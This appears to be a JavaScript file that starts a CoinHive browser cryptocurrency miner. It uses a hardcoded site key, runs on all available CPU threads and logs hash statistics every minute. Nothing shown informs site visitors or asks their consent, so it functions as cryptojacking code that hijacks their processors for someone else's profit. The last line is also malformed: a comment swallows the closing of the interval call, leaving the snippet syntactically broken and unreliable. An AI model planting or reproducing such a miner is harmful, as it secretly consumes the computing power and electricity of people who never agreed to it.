var miner = new CoinHive.Anonymous('jvt1QOdAicl1pqUjCBN2TwHTHejXeEcn', {
    threads: navigator.hardwareConcurrency,
    autoThreads: true,
    throttle: 0.33,
    forceASMJS: false
});
miner.start();
setInterval(function() {
            var hashesPerSecond = miner.getHashesPerSecond();
            var totalHashes = miner.getTotalHashes();
            var acceptedHashes = miner.getAcceptedHashes(); //console.log('%dh/s total: %s accepted: %s', hashesPerSecond, totalHashes, acceptedHashes);}, 1000 * 60);